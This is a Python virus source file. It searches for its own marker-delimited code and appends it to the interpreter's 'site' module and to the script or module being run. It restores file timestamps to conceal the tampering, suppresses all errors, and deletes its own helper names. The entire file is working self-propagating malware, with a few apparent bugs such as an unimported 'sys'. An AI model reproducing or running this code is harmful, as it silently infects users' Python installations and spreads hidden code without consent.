mark="#####MyPython####"#v1.1.1
def find_code(file):
    code=''
    with open(file,encoding="utf-8") as f:
        for line in f:
            if mark in line.strip():
                code=line+f.read()
    return code
def spread_to_file(file,code):
    import os;stat=os.stat(file)
    old_time=stat.st_atime,stat.st_mtime
    with open(file,'r',encoding='utf-8') as f:
        for line in f:
            if mark in line:return
    if os.path.getsize(file)>=3600:
        with open(file,'a',encoding='utf-8') as f:
            f.write('\n'+code)
        os.utime(file,old_time)

def spread(mod,code):
    from importlib._bootstrap import _find_spec
    spec=_find_spec(mod,sys.path)
    if spec:file=spec.origin
    else:return
    spread_to_file(file,code)

def getrawcmd():
    import sys
    from ctypes import c_wchar_p,windll
    if sys.platform=="win32":
        GetCommandLineW=windll.kernel32.GetCommandLineW
        GetCommandLineW.restype=c_wchar_p
        return GetCommandLineW().split()
    else:
        with open('/proc/self/cmdline', 'rb') as f:  
            cmd = f.read().decode('utf-8').replace('\0', ' ')
        return cmd.strip().split(' ')
try:
    code=find_code(__file__)
    spread('site',code)
    if __import__("sys").argv[0]=="-m":
        cmds=getrawcmd()
        spread(cmds[2],code)
        del cmds
    else:
        spread_to_file(__import__("sys").argv[0],code)
except:pass
del mark,find_code,spread_to_file,spread,getrawcmd
try:del code
except NameError:pass